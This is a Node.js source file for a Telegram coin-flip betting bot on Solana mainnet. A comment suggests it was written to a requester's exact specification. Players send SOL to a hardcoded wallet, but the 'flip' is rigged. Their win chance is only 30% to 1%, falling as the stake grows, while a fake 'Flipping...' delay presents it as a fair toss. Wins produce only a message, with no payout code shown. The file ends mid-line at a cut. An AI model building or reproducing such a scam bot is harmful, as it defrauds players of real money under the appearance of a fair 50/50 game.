require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Connection, PublicKey, LAMPORTS_PER_SOL, clusterApiUrl } = require('@solana/web3.js');
const fs = require('fs');

// Initialize
const bot = new TelegramBot(process.env.BOT_TOKEN, { 
  polling: true,
  request: { timeout: 30000 } // Prevent crashes
});
const connection = new Connection(clusterApiUrl('mainnet-beta'));
const WALLET_ADDRESS = '9HL7W4XZJDX6br3ojjU6BLHp7oZVP3nCDKxQ21TNanQf';

// Tiered House Edge System (YOUR EXACT REQUIREMENTS)
function getWinProbability(amount) {
  if (amount <= 0.01) return 0.30;       // 70% house edge
  if (amount <= 0.049) return 0.25;      // 75% edge
  if (amount <= 0.0999999) return 0.20;  // 80% edge
  return 0.01;                           // 99% edge
}

bot.onText(/\/bet (\d+\.?\d*) (heads|tails)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const betAmount = parseFloat(match[1]);
  const userChoice = match[2].toLowerCase();

  // Validate
  if (betAmount < 0.01 || betAmount > 1) {
    return bot.sendMessage(chatId, "❌ Bet must be 0.01-1 SOL");
  }

  // Request payment
  await bot.sendMessage(chatId,
    `💸 Send *exactly ${betAmount} SOL* to:\n\n` +
    `\`${WALLET_ADDRESS}\`\n\n` +
    `Then click: /confirm_${betAmount}_${userChoice}`,
    { parse_mode: 'Markdown' }
  );
});

// Payment confirmation
bot.onText(/\/confirm_(\d+\.?\d*)_(heads|tails)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const betAmount = parseFloat(match[1]);
  const userChoice = match[2].toLowerCase();

  // Verify payment (simplified - replace with real check)
  const paid = await checkPayment(betAmount);
  if (!paid) {
    return bot.sendMessage(chatId, "⚠️ Payment not received. Try again.");
  }

  // Process bet with your tiered edge
  const winProbability = getWinProbability(betAmount);
  const didUserWin = Math.random() < winProbability;
  const result = didUserWin ? userChoice : (userChoice === 'heads' ? 'tails' : 'heads');

  // Show result
  await bot.sendMessage(chatId, `🌀 Flipping...`);
  await new Promise(resolve => setTimeout(resolve, 2000));

  if (didUserWin) {
    const payout = betAmount * 2; // 1:1 payout
    bot.sendMessage(chatId, `🎉 ${result}! Won ${payout} SOL!`);
  } else {
    bot.sendMessage(chatId, `❌ ${result}. Try again?`);
  }
});

// Start command
bot.onText(/\/start/, (